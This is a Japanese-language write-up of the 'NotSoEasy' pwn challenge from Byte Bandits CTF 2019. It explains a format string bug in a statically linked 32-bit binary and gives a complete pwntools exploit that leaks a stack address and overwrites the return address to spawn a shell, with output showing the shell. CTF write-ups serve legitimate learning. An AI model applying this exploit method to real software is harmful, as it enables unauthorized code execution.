# [pwn 270pts] NotSoEasy - Byte Bandits CTF 2019
32ビットです。
```
$ checksec -f not_easy
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No	0		0	not_easy
```
static link + strippedという私の一番嫌いなやつです。
IDAで読むと、/dev/urandomから取得した文字列とfgetsで入力した文字列を比べて合ってても違っても特に大したことはしないバイナリです。
ただし、パスワードが違うときは入力をそのままprintfするのでFSBがあります。
その後putsが呼ばれるので、このGOTを書き換えたいところですが、static linkなので今回はリターンアドレスを書き換えます。
FSBは2回呼べるので、1回目でlibcのアドレスをリークし、2回目でリターンアドレスを書き換えます。

system関数っぽい関数のアドレスは、IDAで`/bin/sh`を検索して見つけました。

```python
from pwn import *

#addr_system = 0x8050790
addr_system = 0x8050bb8
addr_binsh = 0x80ae88c
sock = remote("127.0.0.1", 4001)
#sock = remote("13.233.66.116", 6969)
_ = raw_input()

sock.recvline()
payload = "%24$p"
sock.sendline(payload)
sock.recvline()
sock.recvline()
addr_buf = int(sock.recvline(), 16)
addr_retaddr = addr_buf + 64 - 0x100
print("&retaddr = " + hex(addr_retaddr))

writes = {
    addr_retaddr: addr_system,
    addr_retaddr+4: addr_binsh
}
payload = fmtstr_payload(
    1, writes, write_size = 'short'
)
print(hex(len(payload)))
sock.recvline()
sock.sendline(payload)
sock.recvline()
sock.recvline()
sock.recvline()
sock.interactive()
```

このコード書いた頃はptrlibがFSBに対応してなかったのでpwntools使ってますね。

```
$ python solve.py 
[+] Opening connection to 127.0.0.1 on port 4001: Done

&retaddr = 0xffb18f9c
0x3d
[*] Switching to interactive mode
Bye!
$ whoami
ptr
```

# 感想
static linkという点以外はよくあるFSB問題ですね。